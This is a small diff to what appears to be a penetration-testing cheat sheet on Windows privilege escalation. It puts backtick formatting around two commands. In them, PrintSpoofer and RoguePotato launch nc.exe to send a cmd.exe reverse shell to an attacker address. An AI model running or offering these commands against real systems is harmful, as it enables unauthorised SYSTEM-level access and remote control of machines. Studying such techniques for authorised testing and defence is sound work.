@@ -51,6 +51,6 @@ Alternative:
 Windows Server 2019 and Windows 10 build 1809 onwards
 
 1. PrintSpoofer:\
-   PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"
+   `PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"`
 2. RoguePotato:\
-   RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
+   `RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999`
